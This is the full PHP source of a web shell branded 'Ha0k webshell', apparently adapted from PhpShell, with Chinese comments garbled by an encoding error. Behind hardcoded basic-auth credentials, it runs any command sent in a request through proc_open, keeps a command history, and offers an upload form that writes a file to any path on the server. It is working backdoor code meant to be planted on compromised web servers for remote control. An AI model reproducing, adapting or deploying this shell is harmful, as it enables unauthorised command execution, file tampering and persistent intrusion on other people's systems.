<?php 
//�˴������ö���û� 
$passwd = array('ha0k' => 'ha0k', 
'hackerdsb'=>'hackerdsb'); 
/* �˴���������ı��� */ 
$aliases = array('ls' => 'ipconfig', 
'll' => 'ls -lvhF'); 
if (!isset($_SERVER['PHP_AUTH_USER'])||!isset($_SERVER['PHP_AUTH_PW'])|| 
!isset($passwd[$_SERVER['PHP_AUTH_USER']]) || 
$passwd[$_SERVER['PHP_AUTH_USER']] != $_SERVER['PHP_AUTH_PW']) { 
header('WWW-Authenticate: Basic realm="by Ha0k"'); 
header('HTTP/1.0 401 Unauthorized'); 
$authenticated = false; 
} 
else { 
$authenticated = true; 
/* ��ʼsession */ 
session_start(); 
/* ��ʼ��session. */ 
if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) { 
$_SESSION['cwd'] = getcwd(); //ȡ��ǰĿ¼ 
$_SESSION['history'] = array(); 
$_SESSION['output'] = ''; 
} 
if (!empty($_REQUEST['command'])) { 
if (get_magic_quotes_gpc()) { //0��رգ�1����������ʱ���� 
/* We don't want to add the commands to the history in the 
* escaped form, so we remove the backslashes now. */ 
$_REQUEST['command'] = stripslashes($_REQUEST['command']); //����addslashes()�����������ַ�������ԭ�� 
} 
/* history */ 
if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false) //���ұ��������е�ֵ 
unset($_SESSION['history'][$i]); //���� 
array_unshift($_SESSION['history'], $_REQUEST['command']);//array_unshift()��������������һ�������в����µ�Ԫ�ء�������µ����齫����ӵ�ԭ����Ŀ�ͷ���֡��������շ��ص��ǲ�����Ԫ�غ�����顣 
/* ���Ha0k# command */ 
$_SESSION['output'] .= 'Ha0k# ' . $_REQUEST['command'] . "\n"; 
/* Initialize the current working directory. */ 
if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) { 
$_SESSION['cwd'] = dirname(__FILE__); //��ȡ��ǰ����Ŀ¼ 
} elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], $regs)) { 
/* The current command is a 'cd' command which we have to handle 
* as an internal shell command. */ 
if ($regs[1][0] == '/') { 
/* Absolute path, we use it unchanged. */ 
$new_dir = $regs[1]; 
} else { 
/* Relative path, we append it to the current working 
* directory. */ 
$new_dir = $_SESSION['cwd'] . '/' . $regs[1]; 
} 
/* Transform '/./' into '/' */ 
while (strpos($new_dir, '/./') !== false) 
$new_dir = str_replace('/./', '/', $new_dir); 
/* Transform '//' into '/' */ 
while (strpos($new_dir, '//') !== false) 
$new_dir = str_replace('//', '/', $new_dir); 
/* Transform 'x/..' into '' */ 
while (preg_match('|/\.\.(?!\.)|', $new_dir)) 
$new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir); 
if ($new_dir == '') $new_dir = '/'; 
/* Try to change directory. */ 
if (@chdir($new_dir)) { //�ı䵱ǰĿ¼ 
$_SESSION['cwd'] = $new_dir; 
} else { 
$_SESSION['output'] .= "cd: could not change to: $new_dir\n"; 
} 
} else { 
/* The command is not a 'cd' command, so we execute it after 
* changing the directory and save the output. */ 
chdir($_SESSION['cwd']); //�ı�Ŀ¼ 
/* ������չ */ 
$length = strcspn($_REQUEST['command'], " \t"); //����\t�ַ���������λ�� 
$token = substr($_REQUEST['command'], 0, $length); //ȡ�ַ���0-\t 
if (isset($aliases[$token])) 
$_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length); 
$p = proc_open($_REQUEST['command'], //ִ�нű� 
array(1 => array('pipe', 'w'), 
2 => array('pipe', 'w')), 
$io); 
/* �������� */ 
while (!feof($io[1])) { 
$_SESSION['output'] .= htmlspecialchars(fgets($io[1]), //ת�������ַ�ΪHTML�ַ����� 
ENT_COMPAT, 'GB2312'); 
} 
/* ���� */ 
while (!feof($io[2])) { 
$_SESSION['output'] .= htmlspecialchars(fgets($io[2]), 
ENT_COMPAT, 'GB2312'); 
} 
fclose($io[1]); 
fclose($io[2]); 
proc_close($p);//�رչܵ� 
} 
} 
/* ������JavaScriptʹ��������ʷ��¼ */ 
if (empty($_SESSION['history'])) { 
$js_command_hist = '""'; 
} else { 
$escaped = array_map('addslashes', $_SESSION['history']); 
$js_command_hist = '"", "' . implode('", "', $escaped) . '"';//���������ַ��� 
} 
} 
header('Content-Type: text/html; charset=GB2312'); 
echo '<?xml version="1.0" encoding="GB2312"?>' . "\n"; 
?> 
<?php 
if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) { 
copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']); 
//echo "�ϴ��ļ��ɹ�: " . $HTTP_POST_FILES['userfile']['name']; 
} 
?> 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" 
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"> 
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"> 
<head> 
<title>Ha0k webshell</title> 
<script type="text/javascript" language="JavaScript"> 
var current_line = 0; 
var command_hist = new Array(<?php echo $js_command_hist ?>); 
var last = 0; 
function key(e) { 
if (!e) var e = window.event; 
if (e.keyCode == 38 && current_line < command_hist.length-1) { 
command_hist[current_line] = document.shell.command.value; 
current_line++; 
document.shell.command.value = command_hist[current_line]; 
} 
if (e.keyCode == 40 && current_line > 0) { 
command_hist[current_line] = document.shell.command.value; 
current_line--; 
document.shell.command.value = command_hist[current_line]; 
} 
} 
function init() { 
document.shell.setAttribute("autocomplete", "off"); 
document.shell.output.scrollTop = document.shell.output.scrollHeight; 
document.shell.command.focus(); 
} 
</script> 
<style type="text/css"> 
<!-- 
.STYLE1 { 
color: #33FF33; 
font-weight: bold; 
} 
a:link { 
text-decoration: none; 
} 
a:visited { 
text-decoration: none; 
} 
a:hover { 
text-decoration: none; 
} 
a:active { 
text-decoration: none; 
} 
--> 
</style> 
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" /></head> 
<body onload="init()"> 
<BODY BGCOLOR="#$$$$$$"> 
<BODY TEXT="1afa3a"> 
<h1><a href="http://hi.baidu.com/hackerdsb" class="STYLE1">HA0K</a></h1> 
<h6>WE JUST FOR JUSTICE��FIGHT FOR EVIAL</h6></FONT> 
<?php if (!$authenticated) { ?> 
<p>You failed to authenticate yourself to PhpShell. You can <a 
href="<?php echo $_SERVER['PHP_SELF'] ?>">reload</a> to try again.</p> 
<p>Try reading the <a href="INSTALL">INSTALL</a> file if you're having 
problems with installing PhpShell.</p> 
</body> 
</html> 
<?php // 
exit; 
} 
error_reporting (E_ALL); 
if (empty($_REQUEST['rows'])) $_REQUEST['rows'] = 10; 
?> 
<p>��ǰĿ¼Ϊ: <code><?php echo $_SESSION['cwd'] ?></code></p> 
<form name="shell" action="<?php echo $_SERVER['PHP_SELF'] ?>" method="post"> 
<div> 
<textarea name="output" readonly="readonly" cols="80" rows="<?php echo $_REQUEST['rows'] ?>"> 
<?php 
$lines = substr_count($_SESSION['output'], "\n"); 
$padding = str_repeat("\n", max(0, $_REQUEST['rows']+1 - $lines)); 
echo rtrim($padding . $_SESSION['output']); 
?> 
<</textarea> 
</div><br> 
<p class="prompt"> 
$ <input class="prompt" name="command" type="text" 
onkeyup="key(event)" size="78" tabindex="1"> 
</p> 
<p> 
<input type="submit" value="ִ��" /> 
<input type="submit" name="reset" value="�ָ�" /> 
����: <input type="text" name="rows" value="<?php echo $_REQUEST['rows'] ?>" /> 
</p> 
</form> 
<form enctype="multipart/form-data" action="" method="post"> 
<input type="hidden" name="MAX_FILE_SIZE" value="1000000"> 
<p>�����ļ���: <input name="userfile" type="file"> 
<p>Զ���ļ���: <input name="remotefile" type="text"> 
<input type="submit" value="����"> 
</form> 
</body> 
</html>